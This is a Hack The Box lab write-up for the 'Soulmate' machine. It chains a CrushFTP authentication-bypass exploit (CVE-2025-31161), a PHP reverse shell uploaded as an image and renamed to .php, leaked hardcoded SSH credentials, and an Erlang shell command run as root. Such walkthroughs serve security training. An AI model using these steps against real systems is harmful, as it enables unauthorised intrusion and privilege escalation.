---
clayout: ctf
title: Soulmate
date: 2025-09-10
image: /ctf/hack-the-box/machines/soulmate/info-card.png
type: Hack The Box

ctf:
    - name: Soulmate
      link: https://app.hackthebox.com/machines/721
      thumbnail: /ctf/hack-the-box/machines/soulmate/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/721
          thumbnail: /ctf/hack-the-box/machines/soulmate/pwned.png
---

## Machine Overview

The target machine **Soulmate** exposes a web application and an FTP service. Exploiting the FTP service (CrushFTP) leads to arbitrary file management, which we leverage to upload and rename a PHP reverse shell. From there, we pivot through a custom Erlang-based SSH service to escalate from `www-data` → `ben` → `root`.

## Enumeration

### Nmap Scan

We begin with a standard scan:

```bash
nmap -sC -sV -oN nmap.txt 10.10.11.86
```

**Results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

**Key findings:**

* **22/tcp** → OpenSSH 8.9p1
* **80/tcp** → nginx 1.18.0, redirecting to `http://soulmate.htb/`

## Web Enumeration

### Hostname Resolution

Since the HTTP service redirects, we add the hostname to `/etc/hosts`:

```bash
echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
```

### Website Analysis

Visiting `http://soulmate.htb` reveals a login/registration portal with a user profile feature.

![Soulmate Login Page](/ctf/hack-the-box/machines/soulmate/home.png)

### Virtual Host Enumeration

We brute-force for additional vhosts:

```bash
gobuster vhost \
  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -u http://soulmate.htb \
  -t 20 \
  --append-domain
```

**Result:**

```bash
Found: ftp.soulmate.htb
```

Navigating to `http://ftp.soulmate.htb` redirects to a **CrushFTP** login page.

![ftp.soulmate.htb](/ctf/hack-the-box/machines/soulmate/ftp-soulmate.png)

## Exploiting CrushFTP

CrushFTP is a web-based FTP server. Searching for vulnerabilities, we find a recent exploit:
[CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161).

```bash
python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80
```

**Exploit result:**

```bash
[+] Exploit Complete. You can now login with:
    Username: AuthBypassAccount
    Password: CorrectHorseBatteryStaple.
```

We log in as admin:

![FTP dashboard](/ctf/hack-the-box/machines/soulmate/ftp-dashboard.png)

From **Admin → User Management → Server Files**, we can browse `/app/webProd/` — the web root.

![FTP server's file](/ctf/hack-the-box/machines/soulmate/ftp-server-file.png)

## Initial Foothold

Through the profile page, we can upload an image. By uploading a PHP reverse shell disguised as `.png`, then renaming it to `.php` via the FTP interface, we obtain RCE:

```bash
http://soulmate.htb/assets/images/profiles/random_1757609495.php
```

![FTP shell](/ctf/hack-the-box/machines/soulmate/ftp-rename.png)

Set up a listener:

```bash
nc -lnvp 4444
```

Triggering the shell gives us a foothold:

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation (www-data → ben)

### Enumeration

Checking `/etc/passwd` shows a local user `ben`:

```bash
root:x:0:0:root:/root:/bin/bash
ben:x:1000:1000:,,,:/home/ben:/bin/bash
```

Running **pspy64** reveals a root process executing a custom Erlang script:

```bash
/usr/local/lib/erlang_login/start.escript ...
```

### Erlang Script Analysis

The script configures an SSH daemon on port 2222 and hardcodes credentials:

```bash
{user_passwords, [{"ben", "HouseH0ldings998"}]}
```

### SSH Access

We can now SSH directly as `ben`:

```bash
ssh ben@10.10.11.86
# password: HouseH0ldings998
```

```bash
ben@soulmate:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

> [!IMPORTANT] User flag
> `/home/ben/user.txt`

## Privilege Escalation (ben → root)

From `ben`, we test the local Erlang SSH service:

```bash
nc 127.0.0.1 2222
SSH-2.0-Erlang/5.2.9
```

Logging in:

```bash
ssh ben@127.0.0.1 -p 2222
```

This drops us into an Erlang shell:

```bash
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1>
```

From here, we can execute OS commands:

```bash
(ssh_runner@soulmate)1> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```

We now have **root execution**.

> [!IMPORTANT] Root flag
> `/root/root.txt`
